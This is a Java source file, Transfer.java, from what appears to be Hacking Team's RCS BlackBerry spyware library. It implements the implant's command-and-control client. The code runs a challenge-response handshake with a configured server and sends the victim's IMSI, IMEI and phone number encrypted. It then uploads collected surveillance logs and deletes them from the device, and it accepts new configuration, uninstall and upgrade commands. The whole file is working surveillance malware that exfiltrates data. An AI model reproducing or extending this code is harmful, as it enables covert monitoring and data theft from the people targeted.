/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Transfer.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.IOException;
import java.util.Random;
import java.util.Vector;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.util.Arrays;
import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.Conf;
import com.ht.rcs.blackberry.Device;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;
import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Transfer.
 */
public class Transfer {

    /** The debug instance. */
    //#debug
    protected static Debug debug = new Debug("Transfer", DebugLevel.VERBOSE);

    /** The Constant instance_. */
    private static Transfer instance = new Transfer();

    /**
     * Gets the single instance of Transfer.
     * 
     * @return single instance of Transfer
     */
    public static Transfer getInstance() {
        return instance;
    }

    private LogCollector logCollector;

    private Encryption crypto;
    private String host = "";

    private int port = 0;
    private boolean ssl;

    private boolean wifiPreferred;
    private boolean wifi = false;

    private boolean connected = false;

    public boolean uninstall = false;
    public boolean reload = false;

    private Connection connection = null;

    /** The challenge. */
    byte[] challenge = new byte[16];

    /** The keys. */
    Keys keys;

    /**
     * Instantiates a new transfer.
     */
    protected Transfer() {
        logCollector = LogCollector.getInstance();
        keys = Keys.getInstance();
        crypto = new Encryption();
    }

    protected boolean connectDirect()
    {
        return connect(true);
    }
    
    protected boolean connectMDS()
    {
        return connect(false);
    }
    
    /**
     * @param deviceside == false : connessione via MDS
     * deviceside == true : connessione diretta
     * ref: http://na.blackberry.com/eng/developers/resources/Network_Tranports_tutorial.pdf                       
     * @return true if connected
     */
    private boolean connect(boolean deviceside) {
        if (connected) {
            // #debug
            debug.error("Already connected");
            // #ifdef DBC
            Check.asserts(connection != null, "connection null");
            // #endif
            return true;
        }

        wifi = false;
        if (wifiPreferred) {
            // #debug
            debug.trace("Try wifi, ssl:" + ssl);
            
            
            connection = new WifiConnection(host, port, ssl, deviceside);
            if (connection.isActive()) {
                // #debug
                debug.trace("wifi connecting...");
                wifi = true;
                connected = connection.connect();
                //#debug
                debug.trace("wifi connected: " + connected);
            }
        }

        // fall back
        if (!wifi || !connected) {
            // #debug
            debug.trace("Try direct tcp, ssl:" + ssl);
            connection = new DirectTcpConnection(host, port, ssl, deviceside);
            connected = connection.connect();
        }

        if (connection == null) {
            // #debug
            debug.error("null connection");
            return false;
        }

        // #debug
        debug.info("connected: " + connected);
        return connected;

    }

    protected void disconnect() {
        if (connected) {
            connected = false;
            sendCommand(Proto.BYE);
            connection.disconnect();
            connection = null;
        }
    }

    /**
     * Riceve un intero dalla rete che rappresenta la misura del payload per il
     * comando.
     * 
     * @param command
     * @throws ProtocolException
     */
    protected void fillPayload(Command command) throws ProtocolException {
        // #ifdef DBC
        Check.ensures(command != null, "command null");
        // #endif

        try {
            byte[] buflen = connection.receive(4);
            int len = Utils.byteArrayToInt(buflen, 0);

            sendCommand(Proto.OK);

            fillPayload(command, len);
        } catch (IOException e) {
            // #debug
            debug.error("receiving command: " + e);
            throw new ProtocolException("fillPayload");
        }

    }

    /**
     * Riceve dati per la lunghezza specificata dalla connessione e li usa per
     * riempire il payload del command.
     * 
     * @param command
     * @param len
     * @throws ProtocolException
     */
    protected void fillPayload(Command command, int len)
            throws ProtocolException {
        // #ifdef DBC
        Check.ensures(command != null, "command null");
        // #endif
        // #ifdef DBC
        Check.ensures(len > 0 && len < 65536, "wrong len: " + len);
        // #endif

        try {
            command.payload = connection.receive(len);
            // #debug
            debug.trace("filled with: " + command.payload.length);
        } catch (IOException e) {
            // #debug
            debug.error("receiving command: " + e);
            throw new ProtocolException("fillPayload");
        }
    }

    /**
     * Gets the challenge.
     * 
     * @return the challenge
     * @throws ProtocolException
     *             the protocol exception
     */
    protected void getChallenge() throws ProtocolException {

        // #debug
        debug.info("getChallenge");

        Command command = recvCommand();

        if (command == null || command.id != Proto.CHALLENGE) {
            throw new ProtocolException("=wrong proto.challange");
        }

        // e' arrivato il challange, leggo il contenuto
        if (command != null && command.id == Proto.CHALLENGE) {
            fillPayload(command, 16);

            if (command.size() != 16) {
                // #debug
                debug.error("getChallenge: expecting 16 bytes");
                throw new ProtocolException("getChallenge: expecting 16 bytes");
            }
            // ho 16 byte di challange, li cifro e li salvo
            challenge = crypto.encryptData(command.payload);

        } else {
            throw new ProtocolException("not a valid challenge command");
        }
    }

    /**
     * prende la nuova configurazione e la salva, in modo che alla ripartenza
     * 
     * @param command
     *            the command
     * @return the new conf
     * @throws CommandException
     *             the command exception
     * @throws ProtocolException
     *             the protocol exception
     */
    protected void getNewConf(Command command) throws CommandException,
            ProtocolException {

        // #debug
        debug.trace("getNewConf");

        fillPayload(command);
        if (command.size() > 0) {
            // String filename = Encryption.encryptName(Conf.NEW_CONF, 1);
            AutoFlashFile file = new AutoFlashFile(Conf.NEW_CONF_PATH
                    + Conf.NEW_CONF, true);

            if (file.exists()) {
                file.delete();
            }
            file.create();
            boolean ret = file.write(command.payload);
            if (!ret) {
                throw new CommandException("Cannot write new conf");
            } else {
                sendCommand(Proto.OK);
            }
        }
    }

    protected void getResponse() throws ProtocolException {
        // #debug
        debug.info("getResponse");

        Command command = recvCommand();
        // boolean exception = false;
        if (command == null || command.id != Proto.RESPONSE) {
            throw new ProtocolException("=wrong proto.response");
        }

        // e' arrivato il response, leggo il contenuto
        if (command != null && command.id == Proto.RESPONSE) {
            fillPayload(command, 16);
            if (command.size() != 16) {
                throw new ProtocolException("getResponse: expecting 16 bytes");
            }
            // ho 16 byte di response, lo confronto con il challange crittato
            byte[] cryptoChallenge = crypto.encryptData(challenge);
            if (!Arrays.equals(cryptoChallenge, command.payload)) {
                throw new ProtocolException(
                        "getResponse: challange does not match");
            } else {
                // #debug
                debug.info("Response OK");
                sendCommand(Proto.OK);
            }

        } else {
            throw new ProtocolException("not a valid response command");
        }

    }

    protected void getUpgrade(Command command) throws CommandException {
        // http://www.blackberryforums.com/developer-forum/96815-how-programmatically-download-jad-set-up-into-device.html

        // If you want to *install* an app you'll need to use a browser, as has
        // been said; if you want to *upgrade* an application (or install
        // additional applications via your previously installed app) you can
        // use CodeModuleManager. Just download your cod files with normal
        // networking, then createNewModule() and saveNewModule().

        // One thing I've found is that if you upgrade an app (CLDC app) the new
        // version of the app runs right away. If you upgrade a library you need
        // to reset the device before the changes are picked up (even though
        // isResetRequired() returns false). I guess if saveNewModule returns
        // CMM_OK_MODULE_OVERWRITTEN you know it was a lib and will have to
        // reset (overwriting an app returns CMM_OK).

        ApplicationDescriptor ad = ApplicationDescriptor
                .currentApplicationDescriptor();
        int[] moduleHandles = CodeModuleManager.getModuleHandles();
        for (int i = 0; i < moduleHandles.length; ++i) {
            String name = CodeModuleManager.getModuleName(moduleHandles[i]);
            // #debug
            debug.info(name + " - HANDLE: " + i);
        }
        throw new CommandException("Not Implemented");
    }

    protected void getUpload(Command command) throws CommandException {
        throw new CommandException("Not Implemented");
    }

    /**
     * Inits the.
     * 
     * @param host_
     *            the host_
     * @param port_
     *            the port_
     * @param ssl_
     *            the ssl_
     * @param wifiPreferred_
     *            the wifi preferred_
     */
    public void init(String host_, int port_, boolean ssl_,
            boolean wifiPreferred_) {

        reload = false;
        uninstall = false;

        this.host = host_;
        this.port = port_;
        this.ssl = ssl_;
        this.wifiPreferred = wifiPreferred_;
        crypto.makeKey(Keys.getInstance().getChallengeKey());
    }

    protected boolean parseCommand(Command command) throws ProtocolException {
        // #ifdef DBC
        Check.asserts(command != null, "null command");
        // #endif

        try {

            switch (command.id) {
            case Proto.SYNC:
                // #debug
                debug.info("SYNC");
                syncLogs(command);
                break;

            case Proto.NEW_CONF:
                // #debug
                debug.info("NEW_CONF");
                getNewConf(command);
                break;

            case Proto.UNINSTALL:
                // #debug
                debug.info("UNINSTALL");
                uninstall = true;
                sendCommand(Proto.OK);
                return false;

            case Proto.DOWNLOAD:
                // #debug
                debug.info("DOWNLOAD");
                sendDownload(command);
                break;

            case Proto.UPLOAD:
                // #debug
                debug.info("UPLOAD");
                getUpload(command);
                break;

            case Proto.UPGRADE:
                // #debug
                debug.info("UPGRADE");
                getUpgrade(command);
                reload = true;
                break;

            case Proto.BYE:
                // #debug
                debug.info("BYE");
                return false;

            default:
                break;
            }
        } catch (CommandException ex) {
            // #debug
            debug.warn("parseCommand exception:" + ex);
            sendCommand(Proto.NO);
        }

        return true;
    }

    protected Command recvCommand() {
        // #debug
        debug.trace("recvCommand");

        Command command = null;
        byte[] commandId;
        try {
            commandId = connection.receive(4);
            int id = Utils.byteArrayToInt(commandId, 0);
            if (id != 0) {
                command = new Command(id, null);
            }
        } catch (IOException e) {
            // #debug
            debug.error("receiving command: " + e);
        }

        // #debug
        debug.trace("received: " + command);
        return command;
    }

    /**
     * Send.
     * 
     * @return true, if successful
     */
    public synchronized boolean send() {
        try {
            if (!connectDirect() && !connectMDS()) {
                // #debug
                debug.error("not connected");
                return false;
            }

        } catch (Exception ex) {
            debug.error("not connected: " + ex);
            return false;
        }

        try {
            // challenge response
            // #debug
            debug.trace("ChallengeResponse ->");
            sendChallenge();
            getResponse();

            // #debug
            debug.trace("ChallengeResponse <-");
            getChallenge();
            sendResponse();

            // identificazione
            // #debug
            debug.trace("Ids");
            sendIds();

            // ricezione configurazione o comandi
            for (;;) {
                Command command = recvCommand();
                // #debug
                debug.info("Received command:" + command);
                if (!parseCommand(command)) {
                    // #debug
                    debug.info("finished commands");
                    break;
                }
            }
        } catch (ProtocolException ex) {
            // #debug
            debug.error("protocol exception");
            return false;
        } finally {
            disconnect();
        }

        // #debug
        debug.info("done");
        return true;
    }

    protected void sendChallenge() throws ProtocolException {

        // #debug
        debug.info("sendChallenge");

        // TODO: keep a log seed
        Random random = new Random();

        for (int i = 0; i < 16; i++) {
            challenge[i] = (byte) random.nextInt();
        }

        if (!sendCommand(Proto.CHALLENGE, challenge)) {
            throw new ProtocolException("sendChallenge: cannot send");
        }
    }

    protected boolean sendCommand(Command command) {

        // #ifdef DBC
        Check.requires(command != null, "null command");
        // #endif
        // #debug
        debug.trace("sending command: " + command);

        byte[] data = new byte[command.size() + 4];
        DataBuffer databuffer = new DataBuffer(data, 0, data.length, false);

        databuffer.writeInt(command.id);
        if (command.payload != null) {

            databuffer.write(command.payload);
        } else {
            // #debug
            debug.trace("payload null");
        }

        // #ifdef DBC
        Check.ensures(command.size() + 4 == data.length, "wrong length");
        // #endif

        try {
            return connection.send(data);
        } catch (IOException e) {
            return false;
        }
    }

    protected boolean sendCommand(int command) {
        return sendCommand(new Command(command, null));
    }

    protected boolean sendCommand(int command, byte[] payload) {
        return sendCommand(new Command(command, payload));
    }

    protected void sendManagedCommand(int commandId, byte[] plain,
            boolean cypher) throws ProtocolException {

        byte[] toSend;

        if (cypher) {
            // #debug
            debug.info("Sending Crypto Command: " + commandId);
            toSend = crypto.encryptData(plain);
        } else {
            // #debug
            debug.info("Sending Managed Command: " + commandId);
            toSend = plain;
        }

        sendCommand(commandId, Utils.intToByteArray(plain.length));
        waitForOK();

        boolean sent = false;
        try {
            sent = connection.send(toSend);
        } catch (IOException e) {
            // #debug
            debug.error(e.toString());
        }

        if (!sent) {
            throw new ProtocolException("sendManagedCommand cannot send"
                    + commandId);
        }

        waitForOK();

    }

    protected void sendCryptoCommand(int commandId, byte[] plain)
            throws ProtocolException {

        sendManagedCommand(commandId, plain, true);

    }

    protected void sendDownload(Command command) throws CommandException {
        throw new CommandException("Not Implemented");
    }

    protected void sendIds() throws ProtocolException {

        Device device = Device.getInstance();
        device.refreshData();

        sendCryptoCommand(Proto.VERSION, Device.getVersion()); // 4
        sendCryptoCommand(Proto.SUBTYPE, Device.getSubtype()); // 2
        sendCryptoCommand(Proto.ID, keys.getBuildId()); // 16
        sendCryptoCommand(Proto.INSTANCE, keys.getInstanceId()); // 20

        sendCryptoCommand(Proto.USERID, device.getWImsi());
        sendCryptoCommand(Proto.DEVICEID, device.getWImei());
        sendCryptoCommand(Proto.SOURCEID, device.getWPhoneNumber());

    }

    protected void sendResponse() throws ProtocolException {
        // #ifdef DBC
        Check.requires(challenge != null, "null crypto challange");
        // #endif

        // #debug
        debug.info("sendResponse");

        // challange contiene il challange cifrato, pronto per spedizione
        if (!sendCommand(Proto.RESPONSE, challenge)) {
            throw new ProtocolException("sendResponse: cannot send response");
        }

        waitForOK();
    }

    protected synchronized void syncLogs(Command command)
            throws ProtocolException {

        // #debug
        debug.info("syncLogs connected: " + connected + " wifi: " + wifi);

        sendLogs(Path.SD_PATH);
        sendLogs(Path.USER_PATH);

        sendCommand(Proto.LOG_END);
        waitForOK();
    }

    private void sendLogs(String basePath) throws ProtocolException {
        // #debug
        debug.info("sending logs from: " + basePath);

        Vector dirs = logCollector.scanForDirLogs(basePath);
        int dsize = dirs.size();
        for (int i = 0; i < dsize; ++i) {
            String dir = (String) dirs.elementAt(i);
            Vector logs = logCollector.scanForLogs(basePath, dir);
            int lsize = logs.size();
            for (int j = 0; j < lsize; ++j) {
                String logName = (String) logs.elementAt(j);
                String fullLogName = basePath + dir + logName;
                AutoFlashFile file = new AutoFlashFile(fullLogName, false);
                if (!file.exists()) {
                    // #debug
                    debug.error("File doesn't exist: " + fullLogName);
                    continue;
                }
                byte[] content = file.read();
                // #mdebug
                debug.info("Sending file: " + logCollector.decryptName(logName)
                        + " = " + fullLogName);
                // #enddebug
                sendManagedCommand(Proto.LOG, content, false);
                logCollector.remove(fullLogName);
            }
            if (!Path.removeDirectory(basePath + dir)) {
                // #debug
                debug.warn("Not empty directory");
            }
        }
    }

    private void waitForOK() throws ProtocolException {
        Command ok = recvCommand();
        if (ok == null || ok.id != Proto.OK) {
            throw new ProtocolException("sendCryptoCommand error");
        }
    }
}
